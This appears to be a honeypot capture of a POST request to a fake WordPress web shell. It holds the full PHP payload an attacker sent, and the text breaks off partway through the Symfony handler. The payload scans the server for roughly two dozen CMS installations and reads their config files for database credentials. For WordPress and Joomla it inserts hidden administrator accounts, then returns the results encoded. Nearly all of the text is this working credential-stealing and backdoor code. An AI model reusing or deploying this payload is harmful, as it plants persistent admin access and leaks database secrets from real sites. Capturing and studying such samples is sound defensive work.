
_SERVER
Array
(
    [UNIQUE_ID] => Whxrz@eLB1o3y80B5iob9AAAAAQ
    [SCRIPT_URL] => /wordpress/wp-content/plugins/revslider/temp/update_extract/revslider/db.php
    [SCRIPT_URI] => http://stratigery.com/wordpress/wp-content/plugins/revslider/temp/update_extract/revslider/db.php
    [HTTP_HOST] => stratigery.com
    [CONTENT_LENGTH] => 66299
    [HTTP_ACCEPT_LANGUAGE] => en-US,en;q=0.8
    [HTTP_USER_AGENT] => Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.115 Safari/537.36
    [HTTP_REFERER] => http://stratigery.com/wordpress/wp-content/plugins/revslider/temp/update_extract/revslider/db.php
    [HTTP_COOKIE] => 227e948fdbaaeccbbb7b3f42fbe848e8=227e948fdbaaeccbbb7b3f42fbe848e8; d8670190bc460b6abebf276d20db5892=866fd58d77526c1bda8771b5b21d5b11
    [CONTENT_TYPE] => application/x-www-form-urlencoded
    [PATH] => /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin
    [SERVER_SIGNATURE] => 
    [SERVER_SOFTWARE] => Apache/2.4.29 (Unix) PHP/7.1.12
    [SERVER_NAME] => stratigery.com
    [SERVER_ADDR] => 162.246.45.144
    [SERVER_PORT] => 80
    [REMOTE_ADDR] => 192.185.4.92
    [DOCUMENT_ROOT] => /srv/http/stratigery/htdocs
    [REQUEST_SCHEME] => http
    [CONTEXT_PREFIX] => 
    [CONTEXT_DOCUMENT_ROOT] => /srv/http/stratigery/htdocs
    [SERVER_ADMIN] => bediger@stratigery.com
    [SCRIPT_FILENAME] => /srv/http/stratigery/htdocs/fake_wp/wso.php
    [REMOTE_PORT] => 17041
    [GATEWAY_INTERFACE] => CGI/1.1
    [SERVER_PROTOCOL] => HTTP/1.0
    [REQUEST_METHOD] => POST
    [QUERY_STRING] => 
    [REQUEST_URI] => /wordpress/wp-content/plugins/revslider/temp/update_extract/revslider/db.php
    [SCRIPT_NAME] => /wordpress/wp-content/plugins/revslider/temp/update_extract/revslider/db.php
    [PHP_SELF] => /wordpress/wp-content/plugins/revslider/temp/update_extract/revslider/db.php
    [REQUEST_TIME_FLOAT] => 1511812047.333
    [REQUEST_TIME] => 1511812047
)

_REQUEST
Array
(
    [a] => RC
    [p1] => @ini_set('display_errors',0);
@ini_set('log_errors',0);
@error_reporting(0);
@set_time_limit(0);
@ignore_user_abort(1);
@ini_set('max_execution_time',0);
define ('SHORTINIT',1);
define ('_JEXEC', 1);
define('DS', DIRECTORY_SEPARATOR);



if (strstr($_SERVER['SCRIPT_FILENAME'], $_SERVER['REQUEST_URI']) != FALSE)
{
    $docroot = substr($_SERVER['SCRIPT_FILENAME'], 0, strpos($_SERVER['SCRIPT_FILENAME'], $_SERVER['REQUEST_URI']));
}
else
{
    $docroot = $_SERVER['DOCUMENT_ROOT'];
}

define('JPATH_BASE', $docroot);
define('DRUPAL_ROOT', $docroot);

$analyse_config = Array(
    "is_codeigniter" => "get_codeigniter_info",
    "is_kohana" => "get_kohana_info",
    "is_laravel" => "get_laravel_info",
    "is_yii" => "get_yii_info",
    "is_wordpress" => "get_wp_info",
    "is_joomla" => "get_joomla_info",
    "is_drupal" => "get_drupal_info",
    "is_bitrix" => "get_bitrix_info",
    "is_discuzx" => "get_discuzx_info",
    "is_dle" => "get_dle_info",
    "is_instantcms" => "get_instantcms_info",
    "is_ipb" => "get_ipb_info",
    "is_magento" => "get_magento_info",
    "is_modx" => "get_modx_info",
    "is_mybb" => "get_mybb_info",
    "is_moodle" => "get_moodle_info",
    "is_opencart" => "get_opencart_info",
    "is_phpbb" => "get_phpbb_info",
    "is_prestashop" => "get_prestashop_info",
    "is_smf" => "get_smf_info",
    "is_symfony" => "get_symfony_info",
    "is_typo3" => "get_typo3_info",
    "is_vbulletin" => "get_vbulletin_info",
    "is_xenforo" => "get_xenforo_info",
);



// $result FORMAT:
// $result = Array (
//     "name" => "unknown",
//     "ver" => "unknown",
//     "cms_user" => "unknown",  optional wp/joomla
//     "cms_passwd" => "unknown",  optional wp/joomla
//     "docroot" => "unknown",
//     "db_user" => "unknown",
//     "db_passwd" => "unknown",
//     "db_name" => "unknown",
//     "db_host" => "unknown",
//     "db_prefix" => "unknown",
// );

$result = Array();

foreach (GetFileList($docroot) as $filepath)
{
    foreach($analyse_config as $check_cms_callback=>$get_cms_data_callback)
    {
        $docroot = '';

        if ($check_cms_callback($filepath, $docroot))
        {
            $result[] = $get_cms_data_callback($docroot);
        }
    }
}

echo base64_encode(serialize($result));



function GetFileList($dir, $depth=10000000)
{
    $result = array();

    $dir_count = 0;

    if ($depth < 1) {
        return $result;
    }

    $dir = strlen($dir) == 1 ? $dir : rtrim($dir, '\\/');
    $h = @opendir($dir);
    if ($h === FALSE)
    {
        return $result;
    }

    while (($f = readdir($h)) !== FALSE)
    {
        if ($f !== '.' and $f !== '..')
        {
            $current_dir = "$dir/$f";
            if (is_dir($current_dir))
            {
                $dir_count += 1;

                $result = array_merge($result, GetFileList($current_dir, $depth / 10));
            }
            else
            {
                if (strpos($current_dir, ".php") !== FALSE)
                {
                    $result[] = $current_dir;
                }

            }
        }
    }

    closedir($h);

    return $result;
}


/*
 *
 *
 *
 * 
 *
 *
 * 
 * 
 *
 * 
 * 
 *
 * 
 *
 * 
 *
 *
 */



function is_wordpress ($filepath, &$docroot)
{
    if (strpos ($filepath, "index.php") !== false)
    {

        $src = @file_get_contents ($filepath);

        if (strpos ($src, "wp-blog-header.php") !== false)
        {
            $dir = realpath ($filepath);

            $docroot = dirname ($dir);

            return true;
        }
    }

    return false;
}


function get_wp_info ($docroot)
{

    $cms_data = Array();
    $cms_data['name'] = "wordpress";
    $cms_data['docroot'] = $docroot;
    $cms_data['ver'] = "";
    $cms_data['db_login'] = "";
    $cms_data['db_passwd'] = "";
    $cms_data['db_name'] = "";
    $cms_data['db_host'] = "";
    $cms_data['db_prefix'] = "";


    if (!include_once("$docroot/wp-config.php")) return $cms_data;
    if (!include_once("$docroot/wp-includes/version.php")) return $cms_data;

    if (!isset($wp_version))
    {
        $wp_version = "unknown";
    }

    $cms_data['ver'] = $wp_version;
    $cms_data['db_login'] = DB_USER;
    $cms_data['db_passwd'] = DB_PASSWORD;
    $cms_data['db_name'] = DB_NAME;
    $cms_data['db_host'] = DB_HOST;
    $cms_data['db_prefix'] = $table_prefix;

    return add_wp_user($docroot, $cms_data);
}

function add_wp_user ($docroot, $cms_data)
{
    if (strpos($cms_data['db_host'], ":") !== FALSE)
    {
        $host_port = explode(":", $cms_data['db_host']);
        $host = $host_port[0];
        $port = intval($host_port[1]);
    }
    else
    {
        $host = $cms_data["db_host"];
        $port = 3306;
    }

    $conn = mysqli_connect($host, $cms_data['db_login'], $cms_data['db_passwd'], $cms_data['db_name'], $port);
    $prefix = $cms_data['db_prefix'];

    if (!include_once("$docroot/wp-includes/class-phpass.php")) return $cms_data;

    $wp_hasher = new PasswordHash(8, true);

    $user = "wp.service.controller." . gen_passwd(5);;
    $passwd_orig = gen_passwd();
    $passwd = $wp_hasher->HashPassword($passwd_orig);

    mysqli_query($conn, "INSERT INTO $prefix" . "users (`user_login`, `user_pass`, `user_nicename`, `user_status`, `display_name`) VALUES ('$user', '$passwd', 'Service', 0, 'Service');");
    mysqli_query($conn, "SET @created_user_id = LAST_INSERT_ID();");
    mysqli_query($conn, "INSERT INTO $prefix" . "usermeta (`umeta_id`, `user_id`, `meta_key`, `meta_value`) VALUES (NULL, @created_user_id, 'wp_capabilities', 'a:1:{s:13:\"administrator\";s:1:\"1\";}');");
    mysqli_query($conn, "INSERT INTO $prefix" . "usermeta (`umeta_id`, `user_id`, `meta_key`, `meta_value`) VALUES (NULL, @created_user_id, 'wp_user_level', '10');");

    mysqli_commit($conn);
    mysqli_close($conn);

    $cms_data["cms_user"] = $user;
    $cms_data["cms_passwd"] = $passwd_orig;

    return $cms_data;
}


/*
 *
 *
 *
 * 
 *
 * 
 *
 *
 */



function is_joomla ($filepath, &$docroot)
{
    static $joomla_funded = False;
    if ($joomla_funded)
    {
        return False;
    }
    if (strpos ($filepath, "index.php") !== false)
    {
        $src = @file_get_contents ($filepath);

        if (strpos ($src, "Joomla.Site") !== false || strpos($src, "_JEXEC") !== false)
        {
            $dir = realpath ($filepath);

            $docroot = dirname ($dir);
            
            if (file_exists($docroot. "/configuration.php")) {
                $joomla_funded = True;
                return true;
            }
        }
    }
    return false;
}

function get_joomla_info ($docroot)
{
    $cms_data = Array();
    $cms_data['name'] = "joomla";
    $cms_data['docroot'] = $docroot;
    $cms_data['ver'] = "";
    $cms_data['db_login'] = "";
    $cms_data['db_passwd'] = "";
    $cms_data['db_name'] = "";
    $cms_data['db_host'] = "";
    $cms_data['db_prefix'] = "";

    if (!include_once("$docroot/configuration.php")) return $cms_data;

    $config = new JConfig;

    $cms_data['name'] = "joomla";
    $cms_data['docroot'] = $docroot;
    $cms_data['ver'] = "unknown";
    $cms_data['db_login'] = $config->user;
    $cms_data['db_passwd'] = $config->password;
    $cms_data['db_name'] = $config->db;
    $cms_data['db_host'] = $config->host;
    $cms_data['db_prefix'] = $config->dbprefix;

    if (!include_once($docroot . DS . 'includes' . DS . 'defines.php')) return $cms_data;

    if (file_exists("$docroot/libraries/cms/version/version.php")) // version 2 +
    {
        if (!include_once($docroot . DS . 'libraries' . DS . 'import.php')) return $cms_data;
        if (!include_once("$docroot/libraries/cms/version/version.php")) return $cms_data;
    }
    else
    {
        if (!include_once("$docroot/libraries/joomla/version.php")) return $cms_data;
    }
    $version = new JVersion();

    $cms_data['ver'] = $version->RELEASE;

    return add_joomla_user($docroot, $cms_data);
}

function add_joomla_user ($docroot, $cms_data)
{
    if (strpos($cms_data['db_host'], ":") !== FALSE)
    {
        $host_port = explode(":", $cms_data['db_host']);
        $host = $host_port[0];
        $port = intval($host_port[1]);
    }
    else
    {
        $host = $cms_data["db_host"];
        $port = 3306;
    }

    $conn = mysqli_connect($host, $cms_data['db_login'], $cms_data['db_passwd'], $cms_data['db_name'], $port);
    $prefix = $cms_data['db_prefix'];

    if (!include_once($docroot . DS . 'includes' . DS . 'defines.php')) return $cms_data;

    if (file_exists("$docroot/libraries/cms/version/version.php")) // version 2 +
    {
        if (!include_once($docroot . DS . 'libraries' . DS . 'import.php')) return $cms_data;
        if (!include_once($docroot . DS . 'libraries' . DS . 'cms.php')) return $cms_data;
    }
    else
    {
        if (!include_once($docroot . DS . 'includes' . DS . 'framework.php')) return $cms_data;
    }

    $app = JFactory::getApplication('site');
    $app->initialise();

    jimport('joomla.user.helper');

    $user_new = "joomla.user.helper." . gen_passwd(5);
    $passwd_orig = JUserHelper::genRandomPassword(16);

    if (file_exists("$docroot/libraries/cms/version/version.php")) // version 2 +
    {
        $passwd = JUserHelper::hashPassword($passwd_orig);
        mysqli_query($conn, "INSERT INTO $prefix" . "users (`name`, `username`, `password`, `params`) VALUES ('Service', '$user_new', '$passwd', '');");
        mysqli_query($conn, "SET @created_user_id = LAST_INSERT_ID();");
        mysqli_query($conn, "INSERT INTO $prefix" . "user_usergroup_map (`user_id`,`group_id`) VALUES (@created_user_id, '8');");
    }
    else
    {
        $salt = JUserHelper::genRandomPassword(32);
        $crypt = JUserHelper::getCryptedPassword($passwd_orig, $salt);
        $passwd = $crypt.':'.$salt;

        mysqli_query($conn, "INSERT INTO $prefix" . "users (`name`, `username`, `password`, `usertype`, `gid`, `params`) VALUES ('Service', '$user_new', '$passwd', 'Super Administrator', 25, '');");
        mysqli_query($conn, "SET @created_user_id = LAST_INSERT_ID();");
        mysqli_query($conn, "INSERT INTO $prefix" . "core_acl_aro VALUES (NULL, 'users', @created_user_id, 0, 'Service', 0);");
        mysqli_query($conn, "SET @created_aro_id = LAST_INSERT_ID();");
        mysqli_query($conn, "INSERT INTO $prefix" . "core_acl_groups_aro_map VALUES (25, '', @created_aro_id);");
    }

    mysqli_commit($conn);
    mysqli_close($conn);

    $cms_data["cms_user"] = $user_new;
    $cms_data["cms_passwd"] = $passwd_orig;

    return $cms_data;
}

/*
 *
 *
 *
 * 
 *
 * 
 *
 *
 */

function is_drupal ($filepath, &$docroot)
{
    if (strpos ($filepath, "index.php") !== false)
    {
        $src = @file_get_contents ($filepath);

        if (strpos ($src, "DrupalKernel") !== false || strpos($src, "drupal_bootstrap") !== false)
        {
            $dir = realpath ($filepath);

            $docroot = dirname ($dir);

            return true;
        }
    }
    return false;
}
function get_drupal_info ($docroot)
{
    $cms_data = Array();

    $cms_data['name'] = "drupal";
    $cms_data['docroot'] = $docroot;

    if (!include_once("$docroot/includes/bootstrap.inc")) return $cms_data;
    if (!include_once("$docroot/sites/default/settings.php")) return $cms_data;

    // "cms_ver" => "unknown", // /modules/system/system.info | /core/modules/system/system.info.yml
    if (isset($databases['default']['default'])) // drupal 7,8
    {
        $cms_data['db_login'] = $databases['default']['default']['username'];
        $cms_data['db_passwd'] = $databases['default']['default']['password'];
        $cms_data['db_name'] = $databases['default']['default']['database'];
        $cms_data['db_host'] = $databases['default']['default']['host'];
        $cms_data['db_prefix'] = $databases['default']['default']['prefix'];
    }
    else // drupal 6
    {
        if (isset($db_url))
        {
            $db_config = parse_url(urldecode($db_url));

            $cms_data['ver'] = "6";
            $cms_data['db_login'] = $db_config['user'];
            $cms_data['db_passwd'] = $db_config['pass'];
            $cms_data['db_name'] = trim($db_config['path'], "/");
            $cms_data['db_host'] = $db_config['host'];
            $cms_data['db_prefix'] = "";
        }
    }

    return $cms_data;
}

function gen_passwd($length=16)
{
    $chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';

    $password = '';
    for ( $i = 0; $i < $length; $i++ ) {
        $password .= substr($chars, rand(0, strlen($chars) - 1), 1);
    }

    return $password;
}

/*
 *
 *
 *
 * 
 *
 * 
 *
 *
 */


function getContents ($str, $startDelimiter, $endDelimiter)
{
    $contents = array();

    $startDelimiterLength = strlen($startDelimiter);
    $endDelimiterLength = strlen($endDelimiter);

    $startFrom = $contentStart = $contentEnd = 0;

    while (false !== ($contentStart = strpos($str, $startDelimiter, $startFrom)))
    {
        $contentStart += $startDelimiterLength;
        $contentEnd = strpos($str, $endDelimiter, $contentStart);

        if (false === $contentEnd) {
            break;
        }

        $contents[] = substr($str, $contentStart, $contentEnd - $contentStart);
        $startFrom = $contentEnd + $endDelimiterLength;
    }

    return $contents[0];
}

/*
 *
 *
 *
 * 
 *
 * 
 *
 *
 */

function is_bitrix ($filepath, &$docroot)
{
    if (strpos ($filepath, ".settings.php") !== false)
    {
        $src = @file_get_contents ($filepath);

        if (strpos ($src, "Bitrix") !== false)
        {
            $dir = realpath ($filepath);

            $docroot = dirname (dirname ($dir));

            return true;
        }
    }

    return false;
}

function get_bitrix_info ($docroot)
{
    $src = @file_get_contents ("$docroot/bitrix/.settings.php");

    return array (

        'name' => 'bitrix',
        'ver' => '',
        'docroot' => $docroot,

        'db_host' => getContents ($src, "'host' => '", "'"),
        'db_login' => getContents ($src, "'login' => '", "'"),
        'db_passwd' => getContents ($src, "'password' => '", "'"),
        'db_name' => getContents ($src, "'database' => '", "'"),
        'db_prefix' => ''

    );
}

/*
 *
 *
 *
 * 
 *
 * 
 *
 *
 */


function is_discuzx ($filepath, &$docroot)
{
    if (strpos ($filepath, "forum.php") !== false)
    {
        $src = @file_get_contents ($filepath);

        if (strpos ($src, "DISCUZ_ROOT") !== false)
        {
            $dir = realpath ($filepath);

            $docroot = dirname ($dir);

            return true;
        }
    }

    return false;
}

function get_discuzx_info ($docroot)
{
    $src = @file_get_contents ("$docroot/config/config_global.php");

    return array (

        'name' => 'discuzx',
        'ver' => '',
        'docroot' => $docroot,

        'db_host' => getContents ($src, "'dbhost'] = '", "'"),
        'db_login' => getContents ($src, "'dbuser'] = '", "'"),
        'db_passwd' => getContents ($src, "'dbpw'] = '", "'"),
        'db_name' => getContents ($src, "'dbname'] = '", "'"),
        'db_prefix' => getContents ($src, "'tablepre'] = '", "'"),

    );
}


/*
 *
 *
 *
 * 
 *
 * 
 *
 *
 */

function is_dle ($filepath, &$docroot)
{
    if (strpos ($filepath, "api.class.php") !== false)
    {
        $src = @file_get_contents ($filepath);

        if (strpos ($src, "DLE_API") !== false)
        {
            $dir = realpath ($filepath);

            $docroot = dirname (dirname (dirname ($dir)));

            return true;
        }
    }

    return false;
}

function get_dle_info ($docroot)
{
    $src = @file_get_contents ("$docroot/engine/data/dbconfig.php");

    return array (

        'name' => 'dle',
        'ver' => '',
        'docroot' => $docroot,

        'db_host' => getContents ($src, 'define ("DBHOST", "', '"'),
        'db_login' => getContents ($src, 'define ("DBUSER", "', '"'),
        'db_passwd' => getContents ($src, 'define ("DBPASS", "', '"'),
        'db_name' => getContents ($src, 'define ("DBNAME", "', '"'),
        'db_prefix' => getContents ($src, 'define ("PREFIX", "', '"'),

    );
}

/*
 *
 *
 *
 * 
 *
 * 
 *
 *
 */
function is_instantcms ($filepath, &$docroot)
{
    if (strpos ($filepath, "index.php") !== false)
    {
        $src = @file_get_contents ($filepath);

        $v1 = "cmsPage::includeTemplateFile";
        $v2 = "cmsEventsManager::hook";

        if (strpos ($src, $v1) !== false || strpos ($src, $v2) !== false)
            if (strpos ($src, "VALID_CMS") !== false || strpos ($src, "VALID_RUN") !== false)
            {
                $dir = realpath ($filepath);

                $docroot = dirname ($dir);

                return true;
            }
    }

    return false;
}

function get_instantcms_info ($docroot)
{
    if (file_exists ("$docroot/includes/config.inc.php"))
    {
        $src = @file_get_contents ("$docroot/includes/config.inc.php");

        $src = str_replace (" ", "", $src);
        $src = str_replace ("\t", "", $src);

        return array (

            'name' => 'instantcms',
            'ver' => '1.x',
            'docroot' => $docroot,

            'db_host' => getContents ($src, "\$_CFG['db_host']='", "'"),
            'db_login' => getContents ($src, "\$_CFG['db_user']='", "'"),
            'db_passwd' => getContents ($src, "\$_CFG['db_pass']='", "'"),
            'db_name' => getContents ($src, "\$_CFG['db_base']='", "'"),
            'db_prefix' => getContents ($src, "\$_CFG['db_prefix']='", "'"),

        );
    }
    else
    {
        $src = @file_get_contents ("$docroot/system/config/config.php");

        $src = str_replace (" ", "", $src);
        $src = str_replace ("\t", "", $src);

        return array (

            'name' => 'instantcms',
            'ver' => '2.x',
            'docroot' => $docroot,

            'db_host' => getContents ($src, "'db_host'=>'", "'"),
            'db_login' => getContents ($src, "'db_user'=>'", "'"),
            'db_passwd' => getContents ($src, "'db_pass'=>'", "'"),
            'db_name' => getContents ($src, "'db_name'=>'", "'"),
            'db_prefix' => getContents ($src, "'db_prefix'=>'", "'"),

        );
    }

}

/*
 *
 *
 *
 * 
 *
 * 
 *
 *
 */

function is_ipb ($filepath, &$docroot)
{
    if (strpos ($filepath, "conf_global.php") !== false)
    {
        $src = @file_get_contents ($filepath);

        if (strpos ($src, "\$INFO") !== false)
        {
            $dir = realpath ($filepath);

            $docroot = dirname ($dir);

            return true;
        }
    }

    return false;
}

function get_ipb_info ($docroot)
{
    $src = @file_get_contents ("$docroot/conf_global.php");

    $src = str_replace (" ", "", $src);
    $src = str_replace ("\t", "", $src);

    if (strpos ($src, "'sql_host'=>'") !== false)
    {
        return array (
            'name' => 'ipb',
            'ver' => '4.x',
            'docroot' => $docroot,

            'db_host' => getContents ($src, "'sql_host'=>'", "'"),
            'db_login' => getContents ($src, "'sql_user'=>'", "'"),
            'db_passwd' => getContents ($src, "'sql_pass'=>'", "'"),
            'db_name' => getContents ($src, "'sql_database'=>'", "'"),
            'db_prefix' => getContents ($src, "'sql_tbl_prefix'=>'", "'"),
        );
    }
    else
    {
        return array (
            'name' => 'ipb',
            'ver' => '',
            'docroot' => $docroot,


            'db_host' => getContents ($src, "INFO['sql_host']='", "'"),
            'db_login' => getContents ($src, "INFO['sql_user']='", "'"),
            'db_passwd' => getContents ($src, "INFO['sql_pass']='", "'"),
            'db_name' => getContents ($src, "INFO['sql_database']='", "'"),
            'db_prefix' => getContents ($src, "INFO['sql_tbl_prefix']='", "'"),
        );
    }
}


/*
 *
 *
 *
 * 
 *
 * 
 *
 *
 */


function is_magento ($filepath, &$docroot)
{
    if (strpos ($filepath, "env.php") !== false)
    {
        $src = @file_get_contents ($filepath);

        if (preg_match ("/table_prefix/", $src))
            if (preg_match ("/config_integration_api/", $src))
                if (preg_match ("/customer_notification/", $src))
                {
                    $dir = realpath ($filepath);

                    $docroot = dirname (dirname (dirname ($dir)));

                    return true;
                }
    }

    if (strpos ($filepath, "local.xml") !== false)
    {
        $src = @file_get_contents ($filepath);

        if (preg_match ("/default_setup/", $src))
            if (preg_match ("/table_prefix/", $src))
                if (preg_match ("/dbname/", $src))
                    if (preg_match ("/adminhtml/", $src))
                    {
                        $dir = realpath ($filepath);

                        $docroot = dirname (dirname (dirname ($dir)));

                        return true;
                    }
    }

    return false;
}

function get_magento_info ($docroot)
{
    if (file_exists ("$docroot/app/etc/env.php"))
    {
        $text = @file_get_contents ("$docroot/app/etc/env.php");

        return array (
            'name' => 'Magento',
            'ver' => '2',
            'docroot' => $docroot,

            'db_login' => getContents ($text, "'username' => '", "'"),
            'db_passwd' => getContents ($text, "'password' => '", "'"),
            'db_name' => getContents ($text, "'dbname' => '", "'"),
            'db_host' => getContents ($text, "'host' => '", "'"),
            'db_prefix' => getContents ($text, "'table_prefix' => '", "'")
        );
    }
    else
    {
        $text = @file_get_contents ("$docroot/app/etc/local.xml");

        return array (
            'name' => 'Magento',
            'ver' => '1',
            'docroot' => $docroot,

            'db_login' => getContents ($text, "<username>", "</username>"),
            'db_passwd' => getContents ($text, "<password>", "</password>"),
            'db_name' => getContents ($text, "<dbname>", "</dbname>"),
            'db_host' => getContents ($text, "<host>", "</host>"),
            'db_prefix' => getContents ($text, "<table_prefix>", "</table_prefix>")
        );
    }
}


/*
 *
 *
 *
 * 
 *
 * 
 *
 *
 */

function is_modx ($filepath, &$docroot)
{
    if (strpos (strtolower ($filepath), "config.core.php") !== false)
    {
        $src = @file_get_contents ($filepath);

        if (preg_match ("/MODX_CORE_PATH/", $src))
        {
            $dir = realpath ($filepath);

            $docroot = dirname ($dir);

            return true;
        }
    }

    if (strpos (strtolower ($filepath), "config.inc.php") !== false)
    {
        $src = @file_get_contents ($filepath);

        if (preg_match ("/MODX_SITE_HOSTNAMES/", $src))
        {
            $dir = realpath ($filepath);

            $docroot = dirname (dirname (dirname ($dir)));

            return true;
        }
    }

    return false;
}

function get_modx_info ($docroot)
{
    if (file_exists ("$docroot/core/config/config.inc.php"))
        $src = @file_get_contents ("$docroot/core/config/config.inc.php");
    else
        $src = @file_get_contents ("$docroot/manager/includes/config.inc.php");

    $src = str_replace (" ", "", $src);
    $src = str_replace ("\t", "", $src);

    return array (
        'name' => 'modx',
        'ver' => '',
        'docroot' => $docroot,

        'db_host' => getContents ($src, "\$database_server='", "'"),
        'db_login' => getContents ($src, "\$database_user='", "'"),
        'db_passwd' => getContents ($src, "\$database_password='", "'"),
        'db_name' => str_replace ("`", "", getContents ($src, "\$dbase='", "'")),
        'db_prefix' => getContents ($src, "\$table_prefix='", "'"),
    );
}


/*
 *
 *
 *
 * 
 *
 * 
 *
 *
 */


function is_moodle ($filepath, &$docroot)
{
    if (strpos (strtolower ($filepath), "index.php") !== false)
    {
        $src = @file_get_contents ($filepath);

        if (strpos ($src, "moodle") !== false)
        {
            $dir = realpath ($filepath);

            $docroot = dirname ($dir);

            return true;
        }
    }

    return false;
}

function get_moodle_info ($docroot)
{
    $src = @file_get_contents ("$docroot/config.php");

    $src = str_replace (" ", "", $src);
    $src = str_replace ("\t", "", $src);

    return array (

        'name' => 'moodle',
        'ver' => '',
        'docroot' => $docroot,

        'db_host' => getContents ($src, "dbhost='", "'"),
        'db_login' => getContents ($src, "dbuser='", "'"),
        'db_passwd' => getContents ($src, "dbpass='", "'"),
        'db_name' => getContents ($src, "dbname='", "'"),
        'db_prefix' => getContents ($src, "prefix='", "'"),

    );
}


/*
 *
 *
 *
 * 
 *
 * 
 *
 *
 */


function is_mybb ($filepath, &$docroot)
{
    if (strpos (strtolower ($filepath), "init.php") !== false)
    {
        $src = @file_get_contents ($filepath);

        if (strpos ($src, "defined(\"IN_MYBB\")") !== false)
        {
            $dir = realpath ($filepath);

            $docroot = dirname (dirname ($dir));

            return true;
        }
    }

    return false;
}

function get_mybb_info ($docroot)
{
    $src = @file_get_contents ("$docroot/inc/config.php");

    return array (

        'name' => 'mybb',
        'ver' => '',
        'docroot' => $docroot,

        'db_host' => getContents ($src, "\$config['database']['hostname'] = '", "'"),
        'db_login' => getContents ($src, "\$config['database']['username'] = '", "'"),
        'db_passwd' => getContents ($src, "\$config['database']['password'] = '", "'"),
        'db_name' => getContents ($src, "\$config['database']['database'] = '", "'"),
        'db_prefix' => getContents ($src, "\$config['database']['table_prefix'] = '", "'"),

    );
}

/*
 *
 *
 *
 * 
 *
 * 
 *
 *
 */

function is_opencart ($filepath, &$docroot)
{
    if (strpos (strtolower ($filepath), "account.php") !== false)
    {
        $src = @file_get_contents ($filepath);

        if (strpos ($src, "class ControllerAccountAccount extends Controller {") !== false)
        {
            $dir = realpath ($filepath);

            $docroot = dirname (dirname (dirname (dirname ($dir))));

            return true;
        }
    }

    return false;
}

function get_opencart_info ($docroot)
{
    $src = @file_get_contents ("$docroot/config.php");

    return array (

        'name' => 'opencart',
        'ver' => '',
        'docroot' => $docroot,

        'db_host'   => getContents ($src, "'DB_HOSTNAME', '", "'"),
        'db_login'   => getContents ($src, "'DB_USERNAME', '", "'"),
        'db_passwd' => getContents ($src, "'DB_PASSWORD', '", "'"),
        'db_name'   => getContents ($src, "'DB_DATABASE', '", "'"),
        'db_prefix' => getContents ($src, "'DB_PREFIX', '", "'"),

    );
}


/*
 *
 *
 *
 * 
 *
 * 
 *
 *
 */
function is_phpbb ($filepath, &$docroot)
{
    if (strpos (strtolower ($filepath), "viewtopic.php") !== false)
    {
        $src = @file_get_contents ($filepath);

        if (preg_match ("/IN_PHPBB/", $src))
        {
            $dir = realpath ($filepath);

            while (dirname ($dir) != $dir)
            {
                $dir = dirname ($dir);

                if (file_exists ("$dir/viewtopic.php"))
                {
                    $docroot = $dir;

                    return true;
                }
            }
        }
    }

    return false;
}

function get_phpbb_info ($docroot)
{
    $text = @file_get_contents ("$docroot/config.php");

    return array (
        'name' => 'phpBB',
        'ver' => getContents ($text, "phpBB ", " "),
        'docroot' => $docroot,

        'db_login' => getContents ($text, "dbuser = '", "'"),
        'db_passwd' => getContents ($text, "dbpasswd = '", "'"),
        'db_name' => getContents ($text, "dbname = '", "'"),
        'db_host' => getContents ($text, "dbhost = '", "'"),
        'db_prefix' => getContents ($text, "table_prefix = '", "'")
    );
}

/*
 *
 *
 *
 * 
 *
 * 
 *
 *
 */

function is_prestashop ($filepath, &$docroot)
{
    if (strpos ($filepath, "autoload.php") !== false)
    {
        $src = @file_get_contents ($filepath);

        if (strpos ($src, "PrestaShopAutoload") !== false)
        {
            $dir = realpath ($filepath);

            $docroot = dirname (dirname ($dir));

            return true;
        }
    }

    if (strpos ($filepath, "settings.inc.php") !== false)
    {
        $src = @file_get_contents ($filepath);

        if (strpos ($src, "_PS_CREATION_DATE_") !== false)
            if (strpos ($src, "_PS_VERSION_") !== false)
            {
                $dir = realpath ($filepath);

                $docroot = dirname (dirname ($dir));

                return true;
            }
    }


    return false;

}

function get_prestashop_info ($docroot)
{
    if (file_exists ("$docroot/config/settings.inc.php"))
    {
        $src = @file_get_contents ("$docroot/config/settings.inc.php");

        return array (

            'name' => 'prestashop',
            'ver' => getContents ($src, "define('_PS_VERSION_', '", "'"),
            'docroot' => $docroot,

            'db_host' => getContents ($src, "define('_DB_SERVER_', '", "'"),
            'db_name' => getContents ($src, "define('_DB_NAME_', '", "'"),
            'db_login' => getContents ($src, "define('_DB_USER_', '", "'"),
            'db_passwd' => getContents ($src, "define('_DB_PASSWD_', '", "'"),
            'db_prefix' => getContents ($src, "define('_DB_PREFIX_', '", "'")

        );
    }
    else
    {
        $src = @file_get_contents ("$docroot/app/config/parameters.yml");

        $src = str_replace (" ", "", $src);
        $src = str_replace ("\t", "", $src);


        return array (

            'name' => 'prestashop',
            'ver' => '',
            'docroot' => $docroot,

            'db_host' => getContents ($src, "database_host:", "\n"),
            'db_name' => getContents ($src, "database_name:", "\n"),
            'db_login' => getContents ($src, "database_user:", "\n"),
            'db_passwd' => getContents ($src, "database_password:", "\n"),
            'db_prefix' => getContents ($src, "database_prefix:", "\n")

        );
    }
}

/*
 *
 *
 *
 * 
 *
 * 
 *
 *
 */

function is_smf ($filepath, &$docroot)
{
    if (strpos ($filepath, "Settings.php") !== false)
    {
        $src = @file_get_contents ($filepath);

        if (strpos ($src, "\$boarddir =") !== false)
            if (strpos ($src, "\$mbname") !== false)
            {
                $dir = realpath ($filepath);

                $docroot = dirname ($dir);

                return true;
            }
    }

    return false;
}

function get_smf_info ($docroot)
{
    $src = @file_get_contents ("$docroot/Settings.php");

    $version = '';

    if (strpos ($src, 'SMF 1.') !== false) $version = '1.x';
    if (strpos ($src, '@version 2.') !== false) $version = '2.x';


    return array (

        'name' => 'smf',
        'ver' => $version,
        'docroot' => $docroot,

        'db_host' => getContents ($src, "\$db_server = '", "'"),
        'db_login' => getContents ($src, "\$db_user = '", "'"),
        'db_passwd' => getContents ($src, "\$db_passwd = '", "'"),
        'db_name' => getContents ($src, "\$db_name = '", "'"),
        'db_prefix' => getContents ($src, "\$db_prefix = '", "'"),

    );
}


/*
 *
 *
 *
 * 
 *
 * 
 *
 *
 */

function is_symfony ($filepath, &$docroot)
{
    if (strpos ($filepath, "parameters.yml.dist") !== true)
        if (strpos ($filepath, "parameters.yml") !== false)
        {
            $src = @file_get_contents ($filepath);

